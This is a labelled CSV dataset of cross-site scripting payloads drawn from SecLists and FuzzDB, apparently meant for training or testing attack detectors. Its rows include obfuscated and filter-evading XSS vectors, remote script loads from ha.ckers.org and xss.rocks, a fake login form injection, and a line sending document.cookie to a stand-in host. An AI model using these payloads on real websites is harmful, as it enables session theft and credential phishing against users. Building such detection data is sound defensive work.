Payload,Signature,AttackType,Severity,MITRE,Label,Description
var _=document.createElement(\\'script\\');_.src=\\'//localhost/m\\';document.body.appendChild(_);,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
<!ATTLIST xsl:stylesheet,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
<input autofocus onblur=alert(1)>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
"var str = 'jaVasCript:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e';",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
<script>\u0061lert('22')</script>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
<sVg oNloaD=write()>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
Exploit Description: Using an EMBED tag you can embed a Flash movie that contains XSS. If you add the attributes allowScriptAccess=”never” and allownetworking=”internal” it can mitigate this risk (thank you to Jonathan Vanasco for the info). Demo: http://ha.ckers.org/weird/xssflash.html :,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}},XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
<meter onmouseover=alert('document.domain')>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
Noscript-breaker with mouseover,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
onreverse,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
<style>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
"<input type=""hidden"" oncontentvisibilityautostatechange=""alert(1)""  style=""content-visibility:auto"" >",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
Exploit Description: This vector exploits a bug in IE whre attributes in closing comments are evaluated.,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
<Z oncut=alert()>x,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
res:// installed software probing,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"""alert(1)""",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
alert(window\\u002ex=1),XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
"<script/src=""data:&comma;eval(atob(location.hash.slice(1)))//#alert(1)",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
"<div id=""99"">XXX<style>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
"<div id=""119""><iframe src=""view-source:http://www.example.org/"" frameborder=""0"" style=""width:400px;height:180px""></iframe>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
"<div id=""28"">1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2)  attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=alert(28)&gt;>//[""'`-->]]>]</div>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
&#108;&#101;&<WBR>#114;&#116;&#40;&#39;&#88;&#83<WBR>;&#83;&#39;&#41>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"<handler xmlns:ev=""http://www.w3.org/2001/xml-events"" ev:event=""load"">alert(94)</handler>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
<x onmouseover=alert(1)>hover this!,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
res://c:\\program%20files\\adobe\\acrobat%207.0\\acrobat\\acrobat.dll/#2/#210,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"alert(document.domain.concat(""\n"")",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
</b>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
Super basic HTML breaker 2,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
<iframe src=javascript:alert('1')></iframe>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
Exploit Description: This vector ends styleblocks and uses obfuscated JavaScript to create an alert.,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
<body onload=alert(1)>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
<script>prompt('document.domain')</script>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
Exploit Description: This vector uses XML predicates to obfuscate its payload and the fact that you can use underscores as XML tags. Also a concatenation via ternary operator is being used.,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
&#x0003c;,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
ondblclick,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"<META HTTP-EQUIV=""refresh"" CONTENT=""0; URL=http://;URL=javascript:alert('XSS');"">",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
Eval string contained in name property,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
<textarea onfocus=confirm('XSS') autofocus>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
SCRIPT w/Char Code,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"aim: &c:\windows\system32\calc.exe"" ini=""C:\Documents and Settings\All Users\Start Menu\Programs\Startup\pwnd.bat""",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"<STYLE>.XSS{background-image:url(""javascript:alert('XSS')"");}</STYLE><A CLASS=XSS></A>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"<script src=""data:&comma;alert(1)//",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
id    ID    #REQUIRED>]>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
"<LAYER SRC=""http://ha.ckers.org/scriptlet.html""></LAYER>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
</feImage>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
Exploit Description: This injects VB code and produces a message box. IE only.,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
onanimationend,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"constructor.constructor(""var _ = document.createElement('script');",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
onmessage,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
Exploit Description: Meta with additional URL parameter. If the target website attempts to see if the URL contains an ”http://” you can evade it with the following technique (Submitted by Moritz Naumann http://www.moritz-naumann.com),XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
<svg/**/onload=alert('XSS')>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
ondatasetchanged,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
Embedded Tab,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
Local .htc file,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
Obfuscated body onload vector,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"<image xmlns:xlink=""http://www.w3.org/1999/xlink"">",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
onmspointerup,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
Exploit Description: This vector concatenates a string and evaluates it via usage of common DOM methods and element creation.,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
Exploit Description: This vector evades filters by camouflaging as a comment and inhabiting a JS link.,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
Exploit Description: Fairly esoteric issue dealing with embedding images for bulleted lists. This will only work in the IE rendering engine because of the JavaScript directive. Not a particularly useful cross site scripting vector.,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
onbegin,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
\u003c,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#99&#111&#110&#102&#105&#114&#109&#40&#49&#41,SQLi,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
0?'':'ascr';s3=0?'':'ipt';s4=0?'':':';s5=0?'':'ale';s6=0?'':'rt';s7=,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"<script src=""http://code.jquery.com/jquery-1.4.4.js""></script>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
<script>alert('document.domain')</script>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
"<animate attributeName=""onunload"" to=""alert(89)""/>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
"<SCRIPT SRC=""http://xss.rocks/xss.jpg""></SCRIPT>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
<script src=javascript:alert(1)>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
List-style-image,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
<HTML><BODY>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"<script>new Image().src=""http://localhost/cookie.php?c=""+document.cookie;</script>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
<script>confirm(document.domain)</script>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
Exploit Description: This attack is built together with obfuscated hexadecimal entities and create a JS image source.,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"<img src=x onerror=""&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041"">",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
Exploit Description: This vector adds an onclick event handler to a tag and appends an obfuscated JS alert.,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"""><script>alert('XSS')</script>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
"<div onpointerover=""alert(45)"">MOVE HERE</div>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
"<? foo=""><x foo='?><script>alert(91)</script>'>"">",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
<select onchange=alert(1)><option>1<option>2,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
<D3/OnMouSEenTer=[2].find(confirm)>z,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
<select onfocus=confirm('XSS') autofocus>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
Exploit Description: Another XSS to evade this regex filter: /<script((\s+\w+(\s*=\s*(?:”(.)*?”|'(.)*?'|[^'”>\s]+))?)+\s*|\s*)src/i,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
<svg onload=alert('XSS')>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
<iframe src=javascript:alert(1)>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
onbeforedeactivate,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"""><img src=x onerror=window.open('https://www.google.com/');>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
<SCRIPT SRC=http://ha.ckers.org/xss.js?<B>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
alert('svg title'),XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
%3Cx onxxx=alert(1),XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
<form><button formaction=javascript:alert(1)>click,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
"<div id=""113""><div id=""x"">XXX</div>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
"<div onpointerup=""alert(45)"">MOVE HERE</div>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
Exploit Description: This vector uses XML predicate properties to activate its payload.,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"document.body.innerHTML = ""</br></br></br></br></br><h1>Please login to continue</h1><form>Username: <input type='text'>Password: <input type='password'></form><input value='submit' type='submit'>""",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
"""alert('",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
Backslash-obfuscated XBL injection - variant 2,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
<x%0Conxxx=1,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
"<listener event=""load"" handler=""#y"" xmlns=""http://www.w3.org/2001/xml-events"" observer=""x""/>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
onmspointerdown,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
eval,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
onemptied,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"<p onkeyup=confirm(""XSS"")>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
Exploit Description: BODY image,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"<SCRIPT a=`>` SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
<x onmouseup=alert(1)>click this!,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
for (i=1;i<6;i++) {,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
'><script>alert('document.domain')</script>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
"a=""get"";",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ%2BYWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4NCg%3D%3D""/>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
<script> var+MouseEvent=function+MouseEvent(){}; MouseEvent=MouseEvent var+test=new+MouseEvent(); test.isTrusted=true; test.type='click';  document.getElementById(%22safe123%22).click=function()+{alert(Safe.get());} document.getElementById(%22safe123%22).click(test); </script>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
</image>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
A very short cross browser header injection,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
aim: uri exploit,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
onwheel,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
onoffline,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
Exploit Description: This vector uses line breaks to obfuscate and evaluates the location hash.,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
